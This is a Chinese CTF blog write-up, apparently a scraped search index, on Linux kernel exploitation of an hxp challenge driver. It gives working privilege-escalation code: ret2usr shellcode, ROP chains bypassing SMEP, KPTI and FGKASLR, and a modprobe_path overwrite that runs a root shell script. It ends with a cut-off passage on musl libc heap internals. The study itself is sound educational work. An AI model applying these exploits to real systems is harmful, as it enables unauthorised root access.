为此，我们需要寻找这两个函数的地址。因为KASLR被禁用了，我们以root权限启动的内核，可以通过打开/proc/kallsyms，来找到所有内核函数的地址。 / # cat /proc/kallsyms |grep commit_creds ffffffff814c6410 T commit_creds ffffffff81f87d90 r __ksymtab_commit_creds ffffffff81fa0972 r __kstrtab_commit_creds ffffffff81fa4d42 r __kstrtabns_commit_creds / # cat /proc/kallsyms | grep prepare_kernel_cred ffffffff814c67f0 T prepare_kernel_cred ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred 这样我们就可以编写自己的shellcode了。 void pwned_addr(void){ __asm__( \".intel_syntax noprefix;\" \"movabs rax, 0xffffffff814c67f0;\" //prepare_kernel_cred \"xor rdi, rdi;\" \"call rax; mov rdi, rax;\" \"movabs rax, 0xffffffff814c6410;\" //commit_creds \"call rax;\" ... \".att_syntax;\" ); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:4","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#user-shellcode"},{"categories":["Pwning"],"content":"Return to userland现在我们写的exp，是没有办法获得root权限的。原因是，内核态和用户态是隔离的，当我们执行shellcode时，我们还在内核态，它不会把结果给用户，它没有返回。所以，我们需要其返回用户态。 这里要再讲一下，用户态与内核态之间的切换。当用户态主动进入内核时（系统调用、异常），就会陷入内核态，此时有特权级的提升，涉及到堆栈的切换。首先，要保存user_ss(segment selector)、user_sp、user_flags、user_cs、user_ip以及err等信息。在返回的时候要恢复这些寄存器的值。 对于我们的shellcode，在开始之前也要先保存这些信息，以便在返回的时候让系统走正常的流程。 unsigned long user_cs,user_ss,user_sp,user_rflags,user_rip; void save_state(){ __asm__( \".intel_syntax noprefix;\" \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" \".att_syntax;\" ); puts(\"[*] Saved state\"); } 没有直接操作标志寄存器的方法，所以使用了pushf。另外，我们返回时需要恢复这些值，同时还要恢复gs的值。gs寄存和fs寄存器都是附件段的段寄存器，这些寄存器的具体作用由系统来决定，在Linux中，gs指向TLS结构，通过这个我们可以获取内核堆栈地址等重要信息。在返回时，我们要通过swapgs将其切换回用户态的gs。返回要使用iret： iret指令会按顺序依次弹出eip、cs以及eflag的值到特定寄存器中，然后从新的cs:ip处开始执行。如果特权级发生改变，则还会在弹出eflag后再依次弹出sp与ss寄存器值。 修改shellcode: unsigned long user_rip = (unsigned long)get_shell; void pwned_addr(void){ __asm__( \".intel_syntax noprefix;\" \"movabs rax, 0xffffffff814c67f0;\" //prepare_kernel_cred \"xor rdi, rdi;\" \"call rax; mov rdi, rax;\" \"movabs rax, 0xffffffff814c6410;\" //commit_creds \"call rax;\" \"swapgs;\" \"mov r15, user_ss;\" \"push r15;\" \"mov r15, user_sp;\" \"push r15;\" \"mov r15, user_rflags;\" \"push r15;\" \"mov r15, user_cs;\" \"push r15;\" \"mov r15, user_rip;\" \"push r15;\" \"iretq;\" \".att_syntax;\" ); } 最后，我们的脚本 int main() { save_state(); open_dev(); leak(); overflow(); puts(\"[!] Should never be reached\"); return 0; } result: / $ id uid=1000 gid=1000 groups=1000 / $ ./exploit [*] Saved state [*] Opened device [*] Leaked 160 bytes [*] Cookie: 6b6c612b1bbb5500 [*] Prepared payload [*] Returned to userland [*] UID: 0, got root! / # id uid=0 gid=0 / # cat /dev/s sda sg0 sg1 snapshot sr0 / # cat /dev/sda hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:5","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#return-to-userland"},{"categories":["Pwning"],"content":"Add SMEP\u0026Kernel-ROP下面增加难度，开启SMEP缓解机制。在这之后，所有的用户空间页在内核态都是不可执行的。这使得我们的shellcode无法在内核态执行，ret2usr失效了。我们的目的依然没有变化，在内核态执行commit_creds(prepare_kernel_cred(0))。 此时，我们有两种思路： SMEP由CR4寄存器控制，我们改写CR4的第20比特，使SMEP失效； 在内核中寻找gadget构造ROP链，并返回。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-smepkernel-rop"},{"categories":["Pwning"],"content":"Trying to overwrite CR4理论上，我们可以使用native_write_cr4()改变CR4的值，这个方法很简单直接。但是，人们也注意到了这让内核陷入无比危险的境地。所以，内核在启动时会将CR4固定，如果试图改变就会触发错误。a documentation on CR4 bits pinning 这种方法不可行。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#trying-to-overwrite-cr4"},{"categories":["Pwning"],"content":"构造ROP chain我们需要以下功能： prepare_kernel_cred(0) commit_creds() swapgs;ret 恢复寄存器，iretq 寻找gadget /* 0xffffffff81006370 : pop rdi ; ret 0xffffffff8150b97e : pop rsi ; ret 0xffffffff81007616 : pop rdx ; ret 0xffffffff815f4bbc : pop rcx ; ret 0xffffffff81004d11 : pop rax ; ret 0xffffffff81006158 : pop rbx ; ret 0xffffffff8144591b : pop r13 ; ret 0xffffffff8100636d : pop r12 ; pop r15 ; ret 0xffffffff8100636f : pop r15 ; ret 0xffffffff8100a55f : swapgs ; pop rbp ; ret 0xffffffff8100c0d9: 48 cf iretq 0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret 0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret 0xffffffff816bfe27 : cmp rdi, rsi ; jne 0xffffffff816bfdfa ; pop rbp ; ret */ unsigned long pop_rdi_ret = 0xffffffff81006370; unsigned long pop_rsi_ret = 0xffffffff8150b97e; unsigned long commit_creds = 0xffffffff814c6410; unsigned long prepare_kernel_cred = 0xffffffff814c67f0; unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; unsigned long iretq = 0xffffffff8100c0d9; unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; unsigned long cmp_rdi_rsi_jne_pop_ret = 0xffffffff816bfe27; $ objdump -j .text -d ./vmlinux | grep iretq | head -1 ffffffff8100c0d9: 48 cf iretq 有时ROPgadget找到的gadget并不在可执行区，我们需要再找其他的gadget。 payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rdi_ret; // return address payload[off++] = 0x0; // rdi \u003c- 0 payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) payload[off++] = pop_rdi_ret; payload[off++] = 0x1; // rdi \u003c- 1 payload[off++] = pop_rsi_ret; payload[off++] = 0x1; // rsi \u003c- 1 payload[off++] = cmp_rdi_rsi_jne_pop_ret; payload[off++] = 0x0; // dummy rbp payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi \u003c- rax payload[off++] = 0x0; // dummy rbx payload[off++] = 0x0; // dummy rbp payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) payload[off++] = swapgs_pop_ret; // swapgs payload[off++] = 0x0; // dummy rbp payload[off++] = iretq; // iretq frame payload[off++] = user_rip; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#构造rop-chain"},{"categories":["Pwning"],"content":"Stack pivot我们再加大一些难度假设另一种情况：溢出的长度不足以写入完整的ROP链。此时，就要进行栈迁移。 我们可以找到这样的gadget 0xffffffff810062dc : mov rsp, rbp ; pop rbp ; ret rbp在我们返回的时候就已经可以控制了，所以只要申请一块内存并控制其内容就可以了。 void build_fake_stack(void){ fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0); unsigned off = 0x1000 / 8; fake_stack[0] = 0xdead; // put something in the first page to prevent fault fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = pop_rdi_ret; // return address fake_stack[off++] = 0x0; // rdi \u003c- 0 fake_stack[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) fake_stack[off++] = pop_rdi_ret; fake_stack[off++] = 0x1; // rdi \u003c- 1 fake_stack[off++] = pop_rsi_ret; fake_stack[off++] = 0x1; // rsi \u003c- 1 fake_stack[off++] = cmp_rdi_rsi_jne_pop_ret; fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = mov_rdi_rax_jne_pop2_ret; // rdi \u003c- rax fake_stack[off++] = 0x0; // dummy rbx fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) fake_stack[off++] = swapgs_pop_ret; // swapgs fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = iretq; // iretq frame fake_stack[off++] = user_rip; fake_stack[off++] = user_cs; fake_stack[off++] = user_rflags; fake_stack[off++] = user_sp; fake_stack[off++] = user_ss; } 这里0x5b000000 - 0x1000是为了让栈有增长的空间，以顺利的执行其他函数。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:5:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#stack-pivot"},{"categories":["Pwning"],"content":"Add KPTI有了KPTI用户空间页表与内核空间页表隔离开。我们从内核态直接使用iretq返回，没有切换页表。所以当用户态的程序想要执行时会造成段错误。这里有两种方法进行bypass： 执行正常返回应该执行的函数。 使用信号处理：在Linux中，我们可以注册信号处理函数。在Segmentation fault时，内核会向进程发送一个SIGSEGV信号。一般情况下，这个信号使程序进行异常处理，异常处理的程序在内核代码中，最终结果是杀死这个进程。如果我们注册了处理服务，内核在处理时就会回到用户态！这正达成了我们的目的。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:6:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-kpti"},{"categories":["Pwning"],"content":"Normal ROP正常返回时会调用的函数为swapgs_restore_regs_and_return_to_usermode。我们通过/proc/kallsyms得到它的地址。 / # cat /proc/kallsyms |grep swapgs_restore_regs_and_return_to_usermode ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode 这个函数在ida中是这样的： .text:FFFFFFFF81200F10 pop r15 .text:FFFFFFFF81200F12 pop r14 .text:FFFFFFFF81200F14 pop r13 .text:FFFFFFFF81200F16 pop r12 .text:FFFFFFFF81200F18 pop rbp .text:FFFFFFFF81200F19 pop rbx .text:FFFFFFFF81200F1A pop r11 .text:FFFFFFFF81200F1C pop r10 .text:FFFFFFFF81200F1E pop r9 .text:FFFFFFFF81200F20 pop r8 .text:FFFFFFFF81200F22 pop rax .text:FFFFFFFF81200F23 pop rcx .text:FFFFFFFF81200F24 pop rdx .text:FFFFFFFF81200F25 pop rsi .text:FFFFFFFF81200F26 mov rdi, rsp .text:FFFFFFFF81200F29 mov rsp, qword ptr gs:unk_6004 .text:FFFFFFFF81200F32 push qword ptr [rdi+30h] .text:FFFFFFFF81200F35 push qword ptr [rdi+28h] .text:FFFFFFFF81200F38 push qword ptr [rdi+20h] .text:FFFFFFFF81200F3B push qword ptr [rdi+18h] .text:FFFFFFFF81200F3E push qword ptr [rdi+10h] .text:FFFFFFFF81200F41 push qword ptr [rdi] .text:FFFFFFFF81200F43 push rax .text:FFFFFFFF81200F44 jmp short loc_FFFFFFFF81200F89 ... 前面多出了很多pop xxx这无疑会加长我们的ROP链，所以我们可以从swapgs_restore_regs_and_return_to_usermode+22开始。 还有一些值得关注的地方。 .text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89: .text:FFFFFFFF81200F89 pop rax .text:FFFFFFFF81200F8A pop rdi .text:FFFFFFFF81200F8B call cs:off_FFFFFFFF82040088 .text:FFFFFFFF81200F91 jmp cs:off_FFFFFFFF82040080 ... .text.native_swapgs:FFFFFFFF8146D4E0 push rbp .text.native_swapgs:FFFFFFFF8146D4E1 mov rbp, rsp .text.native_swapgs:FFFFFFFF8146D4E4 swapgs .text.native_swapgs:FFFFFFFF8146D4E7 pop rbp .text.native_swapgs:FFFFFFFF8146D4E8 retn ... .text:FFFFFFFF8120102E mov rdi, cr3 .text:FFFFFFFF81201031 jmp short loc_FFFFFFFF81201067 ... .text:FFFFFFFF81201067 or rdi, 1000h .text:FFFFFFFF8120106E mov cr3, rdi ... .text:FFFFFFFF81200FC7 iretq 在jmp short loc_FFFFFFFF81200F89后，有两个多的pop所以我们要体现布置好填充。 payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = user_rip; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:6:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#normal-rop"},{"categories":["Pwning"],"content":"Signal handler保持原来的payload不变，在main中进行处理函数注册signal(SIGSEGV, get_shell); 绝妙的主意！ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:6:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#signal-handler"},{"categories":["Pwning"],"content":"Add SMAP添加SMAP后用户态的页面无法被访问，这并没有影响我们的ROP。但是栈迁移无法被使用，我们无法将栈劫持到用户空间。 目前绕过的技术仍然未知。TODO ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:7:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-smap"},{"categories":["Pwning"],"content":"Add KASLR现在，我们面对完整的挑战了！ 如果仅仅使用KASLR我们可以在栈上泄露内核的基址并通过偏移找到其他所有函数。这没有增加太大的困难。在FGKASLR下，即使我们知道了内核的基址，其他函数的偏移依然无法确定。 运行多次并查看/proc/kallsyms，发现每次偏移都不同，则开启的FGASLR 在FGKASLR下有一些偏移是不变的： 从_text到__x86_retpoline_r15，即_text+0x400dc6 swwapgs_restore_regs_and_return_to_usermode没有变化 ksymtab地址，该结构记录其他所有函数的地址信息。我们可以从中得到prepare_kernel_cred和commit_creds。 struct kernel_symbol { int value_offset; // funcxx_addr = ksymtab_funcxx_addr + value_offset int name_offset; int namespace_offset; }; 寻找能使用的gadget。 /* ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred ffffffff81f87d90 r __ksymtab_commit_creds 0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret 0xffffffff81004d11 : pop rax ; ret 0xffffffff81006370 : pop rdi ; ret 0xffffffff81007616 : pop rdx ; ret 0xffffffff81006158 : pop rbx ; ret 0xffffffff8100636d : pop r12 ; pop r15 ; ret 0xffffffff8100636f : pop r15 ; ret 0xffffffff8100636e : pop rsp ; pop r15 ; ret */ void leak(void) { unsigned n = 40; unsigned long leak[n]; ssize_t r = read(global_fd, leak, sizeof(leak)); canary = leak[16]; kernel_base = leak[38] - 0xa157ULL; kpti_pass = kernel_base + 0x200f10ULL + 22ULL; pop_rax = kernel_base + 0x4d11ULL; pop_rdi = kernel_base + 0x6370ULL; pop_rdx = kernel_base + 0x7616ULL; pop_rbx = kernel_base + 0x6158ULL; ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcULL; ksymtab_commit_creds = kernel_base + 0xf87d90ULL; read_mrax_pop = kernel_base + 0x15a7fULL; printf(\"[*] Leaked %zd bytes\\n\", r); printf(\"[*] Cookie: %lx\\n\", canary); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#add-kaslr"},{"categories":["Pwning"],"content":"Leak prepare_kernel_cred() \u0026 commit_creds()通过mov rax, qword ptr [rax]可以将value_offset读出，放入到rax中，之后返回用户态，将rax的存入变量中。 payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rax; // return address payload[off++] = ksymtab_commit_creds; payload[off++] = read_mrax_pop; // rax \u003c-- [rax] payload[off++] = 0x0; //dummy rbp payload[off++] = kpti_pass; // swapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = (unsigned long)get_commit_creds; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; void get_prepare_kernel_cred() { __asm__( \".intel_syntax noprefix;\" \"mov tmp_store, rax;\" \".att_syntax;\" ); prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store; printf(\" --\u003e prepare_kernel_cred: %lx\\n\", prepare_kernel_cred); call_prepare_kernel_cred(); } 泄露的payload结构如上，虽然，kpti_pass有会pop rax但是在返回后其值依然会恢复。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#leak-prepare_kernel_cred--commit_creds"},{"categories":["Pwning"],"content":"Call prepare_kernel_cred() \u0026 commit_creds()在我们泄露地址后，之后就是常规的ROP。在commit_creds返回creds后，依然要将其保存。因为之前进行rax --\u003e rdi的gadget都不能用了。 payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rdi; // return address payload[off++] = 0; // rdi \u003c- 0 payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = (unsigned long)get_creds; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#call-prepare_kernel_cred--commit_creds"},{"categories":["Pwning"],"content":"Get root shell ! / $ id uid=1000 gid=1000 groups=1000 / $ ./exploit [*] Saved state [*] Opened device [*] Leaked 320 bytes [*] Cookie: a230d00be9113d00 [*] Prepared leak_commit_creds pa --\u003e commit_creds: ffffffffb2a [*] Prepared leak_prepare_kernel_ --\u003e prepare_kernel_cred: ffff [*] Prepared call_prepare_kernel_ [*] get cred [*] Prepared call_commit_creds pa [*] Returned to userland [*] UID: 0, got root! / # id uid=0 gid=0 / # cat /dev/sda hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#get-root-shell-"},{"categories":["Pwning"],"content":"Technique: Overwriting modprobe_path 什么是modprobe? “modprobe is a Linux program originally written by Rusty Russell and used to add a loadable kernel module to the Linux kernel or to remove a loadable kernel module from the kernel” 当我们安装或卸载一个内核模块时，modprobe就会被执行。而其默认路径modprobe_path就是/sbin/modprobe 可以通过以下命令查看： / # cat /proc/sys/kernel/modprobe /sbin/modprobe modprobe_path是一个全局变量，这意味着，我们可以通过/proc/kallsyms得到它。 当我们执行一个未知类型的文件，modprobe_path指向的文件就会被执行 static int call_modprobe(char *module_name, int wait) { ... argv[0] = modprobe_path; argv[1] = \"-q\"; argv[2] = \"--\"; argv[3] = module_name; argv[4] = NULL; info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL, NULL, free_modprobe_argv, NULL); ... } 如果，将路径覆盖指向我们编写的shell脚本，就实现了以root权限执行任意脚本的目的。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#technique-overwriting-modprobe_path"},{"categories":["Pwning"],"content":"Leak modprobe_path第一步，首先泄露地址。 canary = leak[16]; kernel_base = leak[38] - 0xa157ULL; kpti_pass = kernel_base + 0x200f10ULL + 22ULL; pop_rax = kernel_base + 0x4d11ULL; pop_rdi = kernel_base + 0x6370ULL; pop_rdx = kernel_base + 0x7616ULL; pop_rbx = kernel_base + 0x6158ULL; ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcULL; ksymtab_commit_creds = kernel_base + 0xf87d90ULL; read_mrax_pop = kernel_base + 0x15a7fULL; modprobe_path = kernel_base + 0x1061820ULL; write_mrbx_rax_pop2 = kernel_base + 0x306dULL; //0xffffffff8100306d : mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret 与之前的并没有太大差别。这次要写内存，所以要找一个新gadget ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#leak-modprobe_path"},{"categories":["Pwning"],"content":"Overwrite payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rax; // return address payload[off++] = 0x782f706d742f; // rax \u003c- \"/tmp/x\"; payload[off++] = pop_rbx; payload[off++] = modprobe_path; payload[off++] = write_mrbx_rax_pop2; // [rbx] \u003c-- rax payload[off++] = 0x0; //dummy rbp payload[off++] = 0x0; payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = (unsigned long)get_flag; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; 下一步，我们要让创建一个未知类型的文件，让系统执行，这样系统就会去执行我们的/tmp/x。所以我们的脚本要读出flag。 void get_flag(void){ puts(\"[*] Returned to userland, setting up for fake modprobe\"); system(\"echo '#!/bin/sh\\ncp /dev/sda /tmp/flag\\nchmod 777 /tmp/flag' \u003e /tmp/x\"); system(\"chmod +x /tmp/x\"); system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' \u003e /tmp/dummy\"); system(\"chmod +x /tmp/dummy\"); puts(\"[*] Run unknown file\"); system(\"/tmp/dummy\"); puts(\"[*] Hopefully flag is readable\"); system(\"cat /tmp/flag\"); exit(0); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#overwrite"},{"categories":["Pwning"],"content":"Get flag ! / $ id uid=1000 gid=1000 groups=1000 / $ ./exploit [*] Saved state [*] Opened device [*] Leaked 320 bytes --\u003e Cookie: 3c8fec292491ab00 --\u003e Image base: ffffffff8c800000 [*] Prepared leak_commit_creds payload [*] Returned to userland, setting up for fake modprobe [*] Run unknown file /tmp/dummy: line 1: ����: not found [*] Hopefully flag is readable hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#get-flag-"},{"categories":["Pwning"],"content":"musl libc pwn浅析在defcon结束后，国内外的很多比赛都出现了musl libc的heap exploit，前几天的BSides Noida CTF中的baby musl也以3解告终。所以找了一个时间学习一下，复现了比赛中的题目。 musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如Alpine Linux、OpenWrt和 Gentoo 等。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:0:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#musl-libc-pwn浅析"},{"categories":["Pwning"],"content":"数据结构","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#数据结构"},{"categories":["Pwning"],"content":"chunk struct chunk { size_t psize, csize; // 相当于 glibc 的 prev size 和 size struct chunk *next, *prev; }; chunk的结构大致与glibc类似，chunk之间不会复用任何区域。psize和csize的最后的1bit为inuse控制位。若设置inuse标志位为1，表示 chunk 正在被使用；若没有设置inuse标志位，表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。chunk为0x20字节对齐的！！！ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:1","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#chunk"},{"categories":["Pwning"],"content":"mal static struct { volatile uint64_t binmap; struct bin bins[64]; volatile int free_lock[2]; } mal; mal结构体类似于 glibc 中的arena，记录着堆的状态，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:2","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#mal"},{"categories":["Pwning"],"content":"bin struct bin { volatile int lock[2]; struct chunk *head; struct chunk *tail; }; bin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。 bin 下标 i chunk 大小个数 chunk 大小范围 下标 i 与 chunk 大小范围的关系 0-31 1 0x20 – 0x400 (i+1) * 0x20 32-35 8 0x420 – 0x800 (0x420+(i-32) 0x100) ~ (0x500+(i-32) 0x100) 36-39 16 0x820 – 0x1000 (0x820+(i-36) 0x200) ~ (0x1000+(i-36) 0x200) 40-43 32 0x1020 – 0x2000 (0x1020+(i-40) 0x400) ~ (0x1400+(i-40) 0x400) 44-47 64 0x2020 – 0x4000 (0x2020+(i-44) 0x800) ~ (0x2800+(i-44) 0x800) 48-51 128 0x4020 – 0x8000 (0x4020+(i-48) 0x1000) ~ (0x5000+(i-48) 0x1000) 52-55 256 0x8020 – 0x10000 (0x8020+(i-52) 0x2000) ~ (0xa000+(i-52) 0x2000) 56-59 512 0x10020 – 0x20000 (0x10020+(i-56) 0x4000) ~ (0x14000+(i-56) 0x4000) 60-62 1024 0x20020 – 0x38000 (0x20020+(i-60) 0x8000) ~ (0x28000+(i-60) 0x8000) 63 无限 0x38000 以上 0x38000 ~ 上面是每个 bin 的 chunk 大小范围，可以从源码中的bin_index_up推导出。前 32 个 bin 类似 fastbin 和 small bin，每个 bin 只对应一种大小的 chunk；后 32 个 bin 则类似 large bin，一个 bin 对应多种大小的 chunk。 ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:3","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#bin"},{"categories":["Pwning"],"content":"malloc void *malloc(size_t n) { struct chunk *c; int i, j; // 使size n对齐 if (adjust_size(\u0026n) \u003c 0) return 0; if (n \u003e MMAP_THRESHOLD) { // n达到了mmap分配的阈值（0x38000），使用mmap分配 size_t len = n + OVERHEAD + PAGE_SIZE - 1 \u0026 -PAGE_SIZE; char *base = __mmap(0, len, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); if (base == (void *)-1) return 0; c = (void *)(base + SIZE_ALIGN - OVERHEAD); c-\u003ecsize = len - (SIZE_ALIGN - OVERHEAD); c-\u003epsize = SIZE_ALIGN - OVERHEAD; return CHUNK_TO_MEM(c); } // 计算size对应的bin下标 i = bin_index_up(n); for (;;) { uint64_t mask = mal.binmap \u0026 -(1ULL\u003c\u003ci); // 查找size \u003e n的所有bin if (!mask) { // 没有能满足要求的bin，使用expand_heap申请新chunk c = expand_heap(n); if (!c) return 0; if (alloc_rev(c)) { struct chunk *x = c; c = PREV_CHUNK(c); NEXT_CHUNK(x)-\u003epsize = c-\u003ecsize = x-\u003ecsize + CHUNK_SIZE(c); } break; } j = first_set(mask); // 获取最符合的size对应的bin lock_bin(j); // 对该bin加锁 c = mal.bins[j].head; // 取出bin头 if (c != BIN_TO_CHUNK(j)) { if (!pretrim(c, n, i, j)) unbin(c, j);//使用 pretrim 分割 c，使用 unbin 从链表中取出 c unlock_bin(j); break; } unlock_bin(j); } // 回收 c 中大小超过 n 的部分 /* Now patch up in case we over-allocated */ trim(c, n); return CHUNK_TO_MEM(c); } malloc 详细步骤： 调整 n，增加头部长度和对齐 32 位。 如果 n \u003e MMAP_THRESHOLD，使用 mmap 创建一块大小为 n 的内存，返回给用户。 如果 n \u003c= MMAP_THRESHOLD，计算 n对应的 bin 下标 i，查找 binmap 如果所有的可用 bin 均为空，延展堆空间，生成一个新的 chunk 如果存在非空的可用 bin，选择大小最接近 n的 bin j，得到 bin 链表首部的 chunk c 如果符合 